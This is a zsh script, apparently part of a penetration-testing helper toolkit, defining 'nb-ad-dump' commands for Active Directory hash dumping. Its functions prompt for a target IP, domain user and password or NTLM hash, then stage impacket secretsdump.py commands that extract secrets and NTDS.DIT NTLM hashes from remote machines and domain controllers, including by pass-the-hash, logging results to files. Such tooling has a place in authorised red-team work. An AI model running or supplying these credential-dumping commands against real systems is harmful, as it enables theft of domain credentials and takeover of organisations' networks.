#!/usr/bin/env zsh

############################################################# 
# nb-ad-dump
#############################################################
nb-ad-dump-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-dump
------------
The nb-ad-dump namespace contains commands for hash dumping in Active Directory environment.

Commands
--------
nb-ad-dump-install         installs dependencies
nb-ad-dump-secrets         dump secrets from the remote machine
nb-ad-dump-ntds            extract only NTDS.DIT data (NTLM hashes only)

DOC
}

nb-ad-dump-install() {
    __info "Running $0..."
    __pkgs impacket
}

nb-ad-dump-secrets() {
    __check-project
    __check-domain
    __check-user

    __ask "Provide target machine IP"
    nb-vars-set-rhost
    echo

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        echo
        __ask "Enter a password for authentication"
        __check-pass
        print -z secretsdump.py ${__DOMAIN}/${__USER}:"${__PASS}"@${__RHOST} | tee -a ${__domainadpath}/${__USER}-hashdump.txt
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NTLM hash for authentication"
        __check-hash
        print -z secretsdump.py ${__USER}@${__RHOST} -hashes ${__HASH} | tee -a ${__domainadpath}/${__USER}-hashdump.txt
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-dump-ntds() {
    __check-project
    __check-domain

    __ask "Provide IP of domain controller"
    nb-vars-set-rhost

    __ask "Provide domain admin username"
    nb-vars-set-user
    echo

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        echo
        __ask "Enter a domain admin password for authentication"
        nb-vars-set-pass
        print -z "secretsdump.py ${__DOMAIN}/${__USER}:"${__PASS}"@${__RHOST} -just-dc-ntlm | tee -a ${__domainadpath}/NTDS-hashdump.txt"
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the domain admin NTLM hash for authentication"
        nb-vars-set-pass
        print -z "secretsdump.py ${__USER}@${__RHOST} -hashes ${__HASH} -just-dc-ntlm | tee -a ${__domainadpath}/NTDS-hashdump.txt"
    else
        echo
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}